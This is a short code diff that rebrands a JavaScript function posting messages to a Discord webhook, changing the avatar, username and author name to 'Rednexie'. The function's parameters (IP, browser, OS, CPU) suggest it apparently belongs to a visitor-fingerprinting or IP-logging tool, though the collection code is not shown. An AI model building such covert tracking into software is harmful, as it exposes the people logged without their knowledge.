@@ -147,6 +147,8 @@ function discord(url, content, browser, ip, os, arch, mode, cpu, orientation, ra
     let webhookUrl = url;
 
     const body = {
+        "avatar_url": "https://cdn.discordapp.com/attachments/1068642023789301884/1090565045097873468/kali-removebg-preview.jpg",
+        "username": "Rednexie/uniqueness",
         "content": `${content}`,
         "tts": false,
         "embeds": [
@@ -233,7 +235,7 @@ function discord(url, content, browser, ip, os, arch, mode, cpu, orientation, ra
               }
             ],
             "author": {
-              "name": `Anduril v1.0.3.8`,
+              "name": `Rednexie`,
               "icon_url": `https://cdn.discordapp.com/attachments/1068642023789301884/1090565045097873468/kali-removebg-preview.jpg`
             },
             "url": `https://github.com/Rednexie`
